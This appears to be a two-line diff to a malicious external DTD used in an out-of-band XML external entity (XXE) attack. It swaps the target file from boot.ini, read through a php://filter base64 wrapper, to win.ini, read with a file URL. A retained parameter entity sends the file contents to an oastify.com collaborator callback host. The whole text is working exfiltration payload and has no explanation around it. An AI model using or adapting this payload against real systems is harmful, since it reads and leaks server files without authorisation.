@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=c:/boot.ini">
+<!ENTITY % data SYSTEM "file:///c:\windows\win.ini">
 <!ENTITY % param1 "<!ENTITY exfil SYSTEM 'https://kpdo7hh2m53yjyrkwb43h7nn8ee52zqo.oastify.com/dtd.xml?%data;'>">
